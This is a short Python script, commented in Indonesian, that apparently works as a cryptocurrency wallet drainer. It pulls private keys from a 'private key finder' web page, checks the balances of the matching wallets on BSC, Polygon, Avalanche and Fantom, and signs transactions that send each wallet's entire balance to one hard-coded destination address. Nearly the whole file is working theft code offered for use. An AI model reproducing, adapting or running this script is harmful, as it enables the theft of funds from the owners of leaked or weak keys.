import requests
from web3 import Web3

# Daftar jaringan tanpa Ethereum
NETWORKS = {
    "Binance Smart Chain": "https://bsc-dataseed.binance.org/",
    "Polygon": "https://polygon-rpc.com/",
    "Avalanche": "https://api.avax.network/ext/bc/C/rpc",
    "Fantom": "https://rpc.ftm.tools/"
}

# Alamat tujuan
DESTINATION_ADDRESS = "0x25fa9C6d6bc937d415aD2Bc13F0ca2c01F6E1037"

# Sumber private keys (Gunakan dengan hati-hati!)
PRIVATE_KEYS_URL = "https://privatekeyfinder.io/private-keys/ethereum/"

# Fungsi untuk mengambil private keys
def get_private_keys():
    response = requests.get(PRIVATE_KEYS_URL)
    if response.status_code == 200:
        return response.text.split()  # Pastikan format sesuai
    return []

# Fungsi untuk cek saldo
def get_balance(web3, address):
    balance_wei = web3.eth.get_balance(address)
    return web3.from_wei(balance_wei, 'ether')

# Fungsi untuk mengirim semua saldo
def send_all_funds(web3, private_key, from_address):
    balance = web3.eth.get_balance(from_address)
    if balance == 0:
        return f"Wallet {from_address} kosong."

    gas_price = web3.eth.gas_price
    gas_limit = 21000  # Gas standar untuk transaksi
    transaction_fee = gas_price * gas_limit
    send_amount = balance - transaction_fee  # Sisa saldo setelah fee

    if send_amount <= 0:
        return f"Saldo di {from_address} tidak cukup untuk transaksi."

    # Buat transaksi
    tx = {
        'to': DESTINATION_ADDRESS,
        'value': send_amount,
        'gas': gas_limit,
        'gasPrice': gas_price,
        'nonce': web3.eth.get_transaction_count(from_address),
        'chainId': web3.eth.chain_id
    }

    # Tanda tangani & kirim transaksi
    signed_tx = web3.eth.account.sign_transaction(tx, private_key)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
    return f"Transaksi terkirim: {web3.to_hex(tx_hash)}"

# Main program
private_keys = get_private_keys()
for network, rpc_url in NETWORKS.items():
    web3 = Web3(Web3.HTTPProvider(rpc_url))
    print(f"\n=== Memeriksa Wallet di {network} ===")

    for private_key in private_keys:
        account = web3.eth.account.from_key(private_key)
        balance = get_balance(web3, account.address)

        print(f"Wallet: {account.address} | Saldo: {balance} {network}")

        if balance > 0:
            print(send_all_funds(web3, private_key, account.address))
